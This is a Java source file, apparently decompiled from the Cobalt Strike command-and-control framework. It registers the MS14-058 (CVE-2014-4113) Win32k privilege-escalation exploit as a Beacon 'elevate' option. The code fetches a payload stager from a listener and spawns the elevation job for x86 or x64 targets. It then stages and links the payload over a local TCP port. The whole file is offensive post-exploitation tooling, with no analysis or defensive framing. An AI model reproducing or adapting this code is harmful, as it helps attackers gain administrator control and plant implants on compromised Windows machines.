package beacon.exploits;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import beacon.BeaconExploits;
import beacon.TaskBeacon;
import beacon.jobs.ElevateJob;
import common.BeaconEntry;
import common.CommonUtils;
import common.ListenerUtils;
import common.ScListener;

public class cve_2014_4113 implements BeaconExploits.Exploit {
   protected AggressorClient client;

   public cve_2014_4113(AggressorClient var1) {
      this.client = var1;
      DataUtils.getBeaconExploits(var1.getData()).register("ms14-058", "TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113)", this);
   }

   public void elevate(String var1, String var2) {
      int var3 = CommonUtils.randomPort();
      ScListener var4 = ListenerUtils.getListener(this.client, var2);
      TaskBeacon var5 = new TaskBeacon(this.client, new String[]{var1});
      byte[] var6 = var4.getPayloadStagerLocal(var3, "x86");
      BeaconEntry var7 = DataUtils.getBeacon(this.client.getData(), var1);
      if (var7 != null && var7.is64()) {
         (new ElevateJob(var5, var2, var6)).spawn(var1, "x64");
      } else if (var7 != null) {
         (new ElevateJob(var5, var2, var6)).spawn(var1, "x86");
      } else {
         CommonUtils.print_error("Beacon " + var1 + " has no entry. Not issuing elevate task");
      }

      var5.StageTCP(var1, "127.0.0.1", var3, "x86", var4);
      var5.linkToPayloadLocal(var4);
   }
}
